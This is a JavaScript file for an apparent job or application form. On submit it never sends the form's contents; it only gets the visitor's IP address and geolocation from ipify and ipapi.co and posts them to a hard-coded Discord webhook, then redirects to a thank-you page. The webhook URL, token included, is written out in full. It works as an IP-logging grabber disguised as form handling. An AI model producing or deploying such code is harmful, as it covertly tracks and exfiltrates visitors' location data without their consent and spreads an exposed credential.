document.getElementById('applicationForm').addEventListener('submit', handleFormSubmit);

function getIPInfo() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch IP');
            }
            return response.json();
        })
        .then(data => data.ip)
        .catch(error => {
            console.error('Error fetching IP:', error);
            throw error;
        });
}

function getLocation(ipAddress) {
    return fetch(`https://ipapi.co/${ipAddress}/json/`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch location');
            }
            return response.json();
        })
        .then(locationData => {
            const { city, region, country_name } = locationData;
            return `${city}, ${region}, ${country_name}`;
        })
        .catch(error => {
            console.error('Error fetching location:', error);
            throw error;
        });
}

function sendToDiscord(ipAddress, locationString) {
    const webhookURL = 'https://discord.com/api/webhooks/1261375357739602011/pINOGnvwDjlb-5V5cZ0-qHGAotHBfu6HDItzuotMvK4sQZv1bPWp3YOuhHC0TyW5Wy5k';
    const payload = {
        content: `New Visitor: \nIP Address: ||${ipAddress}||\nLocation: ||${locationString}||`
    };

    return fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
        console.log('Message sent to Discord successfully!');
    })
    .catch(error => {
        console.error('Error sending message to Discord:', error);
        throw error;
    });
}

async function handleFormSubmit(event) {
    event.preventDefault(); // Prevent form from submitting normally

    try {
        const ipAddress = await getIPInfo();
        console.log(`IP Address: ${ipAddress}`); // Debugging log
        const locationString = await getLocation(ipAddress);
        console.log(`Location: ${locationString}`); // Debugging log
        await sendToDiscord(ipAddress, locationString);

        // Redirect to the thank-you page after the webhook is sent
        setTimeout(() => {
            window.location.href = "thanks/lala.html";
        }, 1000); // Redirect after 3 seconds
    } catch (error) {
        console.error('Error handling form submission:', error);
        alert('An error occurred while processing your application. Please try again.');
    }
}
